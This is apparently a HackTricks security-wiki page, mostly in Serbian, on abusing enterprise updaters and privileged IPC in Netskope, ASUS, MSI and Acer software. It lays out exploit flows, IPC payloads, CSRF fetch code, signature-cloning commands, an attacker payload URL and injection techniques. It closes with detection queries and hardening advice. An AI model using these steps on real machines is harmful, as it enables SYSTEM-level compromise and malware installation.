# Zloupotreba enterprise Auto-Updater-a i privilegovanog IPC-a (npr. Netskope, ASUS & MSI)

{{#include ../../banners/hacktricks-training.md}}

Ova stranica generalizuje klasu Windows lokalnih eskalacija privilegija pronađenih u enterprise endpoint agentima i updater-ima koji izlažu nisku-barijernu IPC površinu i privilegovan tok ažuriranja. Reprezentativan primer je Netskope Client for Windows < R129 (CVE-2025-0309), gde korisnik sa niskim privilegijama može prisiliti enrollment na server pod kontrolom napadača i zatim dostaviti zlonamerni MSI koji servis SYSTEM instalira.

Ključne ideje koje možete ponovo iskoristiti protiv sličnih proizvoda:
- Zloupotrebite localhost IPC privilegovanog servisa da prisilite ponovni enrollment ili rekonfiguraciju na server koji kontroliše napadač.
- Implementirajte vendor-ove update endpoint-e, isporučite rogue Trusted Root CA i usmerite updater na maliciozan, „signed“ paket.
- Izbegnite slabe proverе potpisivača (CN allow-lists), opcionе digest zastavice i labave MSI osobine.
- Ako je IPC „encrypted“, izvedite key/IV iz world-readable identifikatora mašine koji su smešteni u registry.
- Ako servis ograničava pozivaoce po image path/process name, injektujte u allow-listovan proces ili pokrenite proces u suspended stanju i bootstrap-ujte svoj DLL preko minimalnog thread-context patch-a.

---
## 1) Prisiljavanje enrollment-a na server napadača putem localhost IPC

Mnogi agenti isporučuju user-mode UI proces koji komunicira sa SYSTEM servisom preko localhost TCP koristeći JSON.

Primećeno u Netskope:
- UI: stAgentUI (niskog integriteta) ↔ Service: stAgentSvc (SYSTEM)
- IPC command ID 148: IDP_USER_PROVISIONING_WITH_TOKEN

Exploit flow:
1) Napravite JWT enrollment token čije tvrdnje kontrolišu backend host (npr. AddonUrl). Koristite alg=None tako da nije potreban potpis.
2) Pošaljite IPC poruku koja poziva provisioning komandu sa vašim JWT-om i imenom tenanta:
```json
{
"148": {
"idpTokenValue": "<JWT with AddonUrl=attacker-host; header alg=None>",
"tenantName": "TestOrg"
}
}
```
3) Servis počinje da šalje zahteve vašem rogue serveru za enrollment/config, npr.:
- /v1/externalhost?service=enrollment
- /config/user/getbrandingbyemail

Notes:
- Ako je caller verification path/name-based, inicirajte zahtev iz allow-listed vendor binary (see §4).

---
## 2) Hijacking the update channel to run code as SYSTEM

Kada klijent komunicira sa vašim serverom, implementirajte očekivane endpoints i usmerite ga na attacker MSI. Tipičan redosled:

1) /v2/config/org/clientconfig → Vratite JSON config sa vrlo kratkim updater intervalom, npr.:
```json
{
"clientUpdate": { "updateIntervalInMin": 1 },
"check_msi_digest": false
}
```
2) /config/ca/cert → Vrati PEM CA sertifikat. Servis ga instalira u Local Machine Trusted Root store.
3) /v2/checkupdate → Dostavi meta-podatke koji ukazuju na maliciozni MSI i lažnu verziju.

Bypassing common checks seen in the wild:
- Signer CN allow-list: servis može samo proveravati da li je Subject CN jednak “netSkope Inc” ili “Netskope, Inc.”. Vaš rogue CA može izdati leaf sertifikat sa tim CN i potpisati MSI.
- CERT_DIGEST property: ubacite benignu MSI property pod nazivom CERT_DIGEST. Nema provere pri instalaciji.
- Optional digest enforcement: config flag (npr. check_msi_digest=false) onemogućava dodatnu kriptografsku validaciju.

Result: the SYSTEM service installs your MSI from
C:\ProgramData\Netskope\stAgent\data\*.msi
executing arbitrary code as NT AUTHORITY\SYSTEM.

---
## 3) Forging encrypted IPC requests (when present)

From R127, Netskope wrapped IPC JSON in an encryptData field that looks like Base64. Reversing showed AES with key/IV derived from registry values readable by any user:
- Key = HKLM\SOFTWARE\NetSkope\Provisioning\nsdeviceidnew
- IV  = HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\ProductID

Attackers can reproduce encryption and send valid encrypted commands from a standard user. General tip: if an agent suddenly “encrypts” its IPC, look for device IDs, product GUIDs, install IDs under HKLM as material.

---
## 4) Bypassing IPC caller allow-lists (path/name checks)

Some services try to authenticate the peer by resolving the TCP connection’s PID and comparing the image path/name against allow-listed vendor binaries located under Program Files (e.g., stagentui.exe, bwansvc.exe, epdlp.exe).

Two practical bypasses:
- DLL injection into an allow-listed process (e.g., nsdiag.exe) and proxy IPC from inside it.
- Spawn an allow-listed binary suspended and bootstrap your proxy DLL without CreateRemoteThread (see §5) to satisfy driver-enforced tamper rules.

---
## 5) Tamper-protection friendly injection: suspended process + NtContinue patch

Products often ship a minifilter/OB callbacks driver (e.g., Stadrv) to strip dangerous rights from handles to protected processes:
- Process: removes PROCESS_TERMINATE, PROCESS_CREATE_THREAD, PROCESS_VM_READ, PROCESS_DUP_HANDLE, PROCESS_SUSPEND_RESUME
- Thread: restricts to THREAD_GET_CONTEXT, THREAD_QUERY_LIMITED_INFORMATION, THREAD_RESUME, SYNCHRONIZE

A reliable user-mode loader that respects these constraints:
1) CreateProcess of a vendor binary with CREATE_SUSPENDED.
2) Obtain handles you’re still allowed to: PROCESS_VM_WRITE | PROCESS_VM_OPERATION on the process, and a thread handle with THREAD_GET_CONTEXT/THREAD_SET_CONTEXT (or just THREAD_RESUME if you patch code at a known RIP).
3) Overwrite ntdll!NtContinue (or other early, guaranteed-mapped thunk) with a tiny stub that calls LoadLibraryW on your DLL path, then jumps back.
4) ResumeThread to trigger your stub in-process, loading your DLL.

Because you never used PROCESS_CREATE_THREAD or PROCESS_SUSPEND_RESUME on an already-protected process (you created it), the driver’s policy is satisfied.

---
## 6) Practical tooling
- NachoVPN (Netskope plugin) automates a rogue CA, malicious MSI signing, and serves the needed endpoints: /v2/config/org/clientconfig, /config/ca/cert, /v2/checkupdate.
- UpSkope is a custom IPC client that crafts arbitrary (optionally AES-encrypted) IPC messages and includes the suspended-process injection to originate from an allow-listed binary.

---
## 1) Browser-to-localhost CSRF against privileged HTTP APIs (ASUS DriverHub)

DriverHub ships a user-mode HTTP service (ADU.exe) on 127.0.0.1:53000 that expects browser calls coming from https://driverhub.asus.com. The origin filter simply performs `string_contains(".asus.com")` over the Origin header and over download URLs exposed by `/asus/v1.0/*`. Any attacker-controlled host such as `https://driverhub.asus.com.attacker.tld` therefore passes the check and can issue state-changing requests from JavaScript. See [CSRF basics](../../pentesting-web/csrf-cross-site-request-forgery.md) for additional bypass patterns.

Practical flow:
1) Register a domain that embeds `.asus.com` and host a malicious webpage there.
2) Use `fetch` or XHR to call a privileged endpoint (e.g., `Reboot`, `UpdateApp`) on `http://127.0.0.1:53000`.
3) Send the JSON body expected by the handler – the packed frontend JS shows the schema below.
```javascript
fetch("http://127.0.0.1:53000/asus/v1.0/Reboot", {
method: "POST",
headers: { "Content-Type": "application/json" },
body: JSON.stringify({ Event: [{ Cmd: "Reboot" }] })
});
```
Čak i PowerShell CLI prikazan ispod uspeva kada se Origin header lažira na pouzdanu vrednost:
```powershell
Invoke-WebRequest -Uri "http://127.0.0.1:53000/asus/v1.0/Reboot" -Method Post \
-Headers @{Origin="https://driverhub.asus.com"; "Content-Type"="application/json"} \
-Body (@{Event=@(@{Cmd="Reboot"})}|ConvertTo-Json)
```
Any browser visit to the attacker site therefore becomes a 1-click (or 0-click via `onload`) local CSRF that drives a SYSTEM helper.

---
## 2) Neispravna provera digitalnog potpisivanja i kloniranje sertifikata (ASUS UpdateApp)

`/asus/v1.0/UpdateApp` preuzima proizvoljne izvršne fajlove definisane u JSON telu i kešira ih u `C:\ProgramData\ASUS\AsusDriverHub\SupportTemp`. Validacija URL-a za preuzimanje ponovo koristi istu logiku provere podniza, tako da je `http://updates.asus.com.attacker.tld:8000/payload.exe` prihvaćen. Nakon preuzimanja, ADU.exe samo proverava da li PE sadrži potpis i da li Subject string odgovara ASUS pre nego što ga pokrene – nema `WinVerifyTrust`, nema verifikacije lanca.

Da bi se iskoristio tok:
1) Napravite payload (npr., `msfvenom -p windows/exec CMD=notepad.exe -f exe -o payload.exe`).
2) Klonirajte ASUS-ov signer u njega (npr., `python sigthief.py -i ASUS-DriverHub-Installer.exe -t payload.exe -o pwn.exe`).
3) Hostujte `pwn.exe` na `.asus.com` lookalike domenu i pokrenite UpdateApp preko browser CSRF opisanog iznad.

Pošto su oba filtera za Origin i URL zasnovana na proveri podniza, a provera signera upoređuje samo stringove, DriverHub povlači i izvršava napadački binarni fajl pod svojim povišenim kontekstom.

---
## 1) TOCTOU unutar updater copy/execute puteva (MSI Center CMD_AutoUpdateSDK)

SYSTEM servis MSI Centra izlaže TCP protokol gde je svaki frame `4-byte ComponentID || 8-byte CommandID || ASCII arguments`. Core komponenta (Component ID `0f 27 00 00`) sadrži `CMD_AutoUpdateSDK = {05 03 01 08 FF FF FF FC}`. Njegov obrađivač:
1) Kopira isporučen izvršni fajl u `C:\Windows\Temp\MSI Center SDK.exe`.
2) Verifikuje potpis preko `CS_CommonAPI.EX_CA::Verify` (certificate subject mora biti tačno “MICRO-STAR INTERNATIONAL CO., LTD.” i `WinVerifyTrust` mora uspeti).
3) Kreira scheduled task koji pokreće temp fajl kao SYSTEM sa argumentima koje kontroliše napadač.

Kopirani fajl nije zaključan između verifikacije i `ExecuteTask()`. Napadač može:
- Poslati Frame A koji pokazuje na legitimni MSI-potpisani binarni fajl (garantuje da provera potpisa prođe i da se task stavi u red).
- Trkati to sa ponovljenim Frame B porukama koje pokazuju na maliciozni payload, prepisujući `MSI Center SDK.exe` odmah nakon što verifikacija završi.

Kada scheduler pokrene task, izvršiće prepisani payload pod SYSTEM nalogom uprkos tome što je originalni fajl bio validiran. Pouzdana eksploatacija koristi dve goroutine/thread-ove koji spam-aju CMD_AutoUpdateSDK dok se ne osvoji TOCTOU prozor.

---
## 2) Zloupotreba custom SYSTEM-level IPC & impersonation (MSI Center + Acer Control Centre)

### MSI Center TCP command sets
- Svaki plugin/DLL učitan od strane `MSI.CentralServer.exe` dobija Component ID koji se čuva pod `HKLM\SOFTWARE\MSI\MSI_CentralServer`. Prva 4 bajta frame-a biraju tu komponentu, što napadačima omogućava da rutiraju komande ka proizvoljnim modulima.
- Pluginovi mogu definisati sopstvene task runnere. `Support\API_Support.dll` izlaže `CMD_Common_RunAMDVbFlashSetup = {05 03 01 08 01 00 03 03}` i direktno poziva `API_Support.EX_Task::ExecuteTask()` bez **provere potpisa** – bilo koji lokalni korisnik može da ga usmeri na `C:\Users\<user>\Desktop\payload.exe` i da deterministički dobije SYSTEM izvršenje.
- Sniffovanje loopback sa Wireshark-om ili instrumentacija .NET binarnih fajlova u dnSpy brzo otkriva mapping Component ↔ command; custom Go/Python klijenti zatim mogu replay-ovati frame-ove.

### Acer Control Centre named pipes & impersonation levels
- `ACCSvc.exe` (SYSTEM) izlaže `\\.\pipe\treadstone_service_LightMode`, i njegova discretionary ACL dozvoljava udaljenim klijentima pristup (npr., `\\TARGET\pipe\treadstone_service_LightMode`). Slanje command ID `7` sa file path poziva rutinu servisa za spawnovanje procesa.
- Klijentska biblioteka serializuje magic terminator bajt (113) zajedno sa argumentima. Dinamička instrumentacija sa Frida/`TsDotNetLib` (vidi [Reversing Tools & Basic Methods](../../reversing/reversing-tools-basic-methods/README.md) za savete o instrumentaciji) pokazuje da native handler mapira ovu vrednost na `SECURITY_IMPERSONATION_LEVEL` i integrity SID pre poziva `CreateProcessAsUser`.
- Zamena 113 (`0x71`) za 114 (`0x72`) ulazi u generičku granu koja zadržava kompletan SYSTEM token i postavlja high-integrity SID (`S-1-16-12288`). Spawn-ovani binarni fajl stoga radi kao neograničeni SYSTEM, lokalno i cross-machine.
- Kombinujte to sa izloženim installer flag-om (`Setup.exe -nocheck`) da se ACC podigne čak i na lab VM-ovima i ispita pipe bez vendor hardvera.

Ovi IPC bagovi naglašavaju zašto localhost servisi moraju primenjivati mutual authentication (ALPC SIDs, `ImpersonationLevel=Impersonation` filtere, token filtering) i zašto svaki modulov “run arbitrary binary” helper mora deliti iste provere signera.

---
## Remote supply-chain hijack via weak updater validation (WinGUp / Notepad++)

Stariji WinGUp-based Notepad++ updaters nisu u potpunosti verifikovali autentičnost update-a. Kada su napadači kompromitovali hosting provajdera za update server, mogli su menjati XML manifest i preusmeriti samo odabrane klijente na napadačke URL-ove. Pošto klijent prihvata bilo koji HTTPS odgovor bez insistiranja na pouzdanom sertifikatnom lancu i validnom PE potpisu, žrtve su preuzimale i izvršavale trojanizovan NSIS `update.exe`.

Operativni tok (nije potreban lokalni exploit):
1. Infrastructure interception: kompromitovati CDN/hosting i odgovoriti na update check-ove sa attacker metadata koja pokazuje na maliciozni download URL.
2. Trojanized NSIS: installer preuzima/izvršava payload i zloupotrebljava dve izvršne putanje:
- Bring-your-own signed binary + sideload: ubacite potpisani Bitdefender `BluetoothService.exe` i ostavite maliciozni `log.dll` u njegovom search path-u. Kada potpisani binarni pokrene, Windows sideload-uje `log.dll`, koji dešifruje i reflectively učitava Chrysalis backdoor (Warbird-protected + API hashing da oteža statičku detekciju).
- Scripted shellcode injection: NSIS izvršava kompajlirani Lua skript koji koristi Win32 API-je (npr., `EnumWindowStationsW`) da injektuje shellcode i stage-uje Cobalt Strike Beacon.

Hardening/detekcija — ključne smernice za svaki auto-updater:
- Primorajte **certificate + signature verification** za preuzeti installer (pinovati vendor signer, odbaciti mismatched CN/chain) i potpisivati sam update manifest (npr., XMLDSig). Blokirajte manifest-controlled redirects osim ako nisu validirani.
- Posmatrajte **BYO signed binary sideloading** kao pivot za detekciju: alarmirajte kada potpisani vendor EXE učitava DLL ime izvan svog kanonskog instalacionog puta (npr., Bitdefender koji učitava `log.dll` iz Temp/Downloads) i kada updater drop-uje/izvršava instalere iz temp sa ne-vendor potpisima.
- Monitorišite **malware-specific artifacts** zabeležene u ovom lancu (korisno kao generički pivot): mutex `Global\Jdhfv_1.0.1`, anomalna `gup.exe` pisanja u `%TEMP%`, i Lua-driven shellcode injection stage-ovi.

<details>
<summary>Cortex XDR XQL – Bitdefender-signed EXE sideloading <code>log.dll</code> (T1574.001)</summary>
```sql
// Identifies Bitdefender-signed processes loading log.dll outside vendor paths
config case_sensitive = false
| dataset = xdr_data
| fields actor_process_signature_vendor, actor_process_signature_product, action_module_path, actor_process_image_path, actor_process_image_sha256, agent_os_type, event_type, event_id, agent_hostname, _time, actor_process_image_name
| filter event_type = ENUM.LOAD_IMAGE and agent_os_type = ENUM.AGENT_OS_WINDOWS
| filter actor_process_signature_vendor contains "Bitdefender SRL" and action_module_path contains "log.dll"
| filter actor_process_image_path not contains "Program Files\\Bitdefender"
| filter not actor_process_image_name in ("eps.rmm64.exe", "downloader.exe", "installer.exe", "epconsole.exe", "EPHost.exe", "epintegrationservice.exe", "EPPowerConsole.exe", "epprotectedservice.exe", "DiscoverySrv.exe", "epsecurityservice.exe", "EPSecurityService.exe", "epupdateservice.exe", "testinitsigs.exe", "EPHost.Integrity.exe", "WatchDog.exe", "ProductAgentService.exe", "EPLowPrivilegeWorker.exe", "Product.Configuration.Tool.exe", "eps.rmm.exe")
```
</details>

<details>
<summary>Cortex XDR XQL – <code>gup.exe</code> pokreće instalacioni program koji nije Notepad++</summary>
```sql
config case_sensitive = false
| dataset = xdr_data
| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START and _product = "XDR agent" and _vendor = "PANW"
| filter lowercase(actor_process_image_name) = "gup.exe" and actor_process_signature_status not in (null, ENUM.UNSUPPORTED, ENUM.FAILED_TO_OBTAIN ) and action_process_signature_status not in (null, ENUM.UNSUPPORTED, ENUM.FAILED_TO_OBTAIN )
| filter lowercase(action_process_image_name) ~= "(npp[\.\d]+?installer)"
| filter action_process_signature_status != ENUM.SIGNED or lowercase(action_process_signature_vendor) != "notepad++"
```
</details>

Ovi obrasci se mogu primeniti na bilo koji updater koji prihvata unsigned manifests ili ne uspeva da pin installer signers — network hijack + malicious installer + BYO-signed sideloading dovode do remote code execution pod izgovorom “trusted” updates.

---
## Reference
- [Advisory – Netskope Client for Windows – Local Privilege Escalation via Rogue Server (CVE-2025-0309)](https://blog.amberwolf.com/blog/2025/august/advisory---netskope-client-for-windows---local-privilege-escalation-via-rogue-server/)
- [NachoVPN – Netskope plugin](https://github.com/AmberWolfCyber/NachoVPN)
- [UpSkope – Netskope IPC client/exploit](https://github.com/AmberWolfCyber/UpSkope)
- [NVD – CVE-2025-0309](https://nvd.nist.gov/vuln/detail/CVE-2025-0309)
- [SensePost – Pwning ASUS DriverHub, MSI Center, Acer Control Centre and Razer Synapse 4](https://sensepost.com/blog/2025/pwning-asus-driverhub-msi-center-acer-control-centre-and-razer-synapse-4/)
- [sensepost/bloatware-pwn PoCs](https://github.com/sensepost/bloatware-pwn)
- [Unit 42 – Nation-State Actors Exploit Notepad++ Supply Chain](https://unit42.paloaltonetworks.com/notepad-infrastructure-compromise/)
- [Notepad++ – hijacked infrastructure incident update](https://notepad-plus-plus.org/news/hijacked-incident-info-update/)

{{#include ../../banners/hacktricks-training.md}}
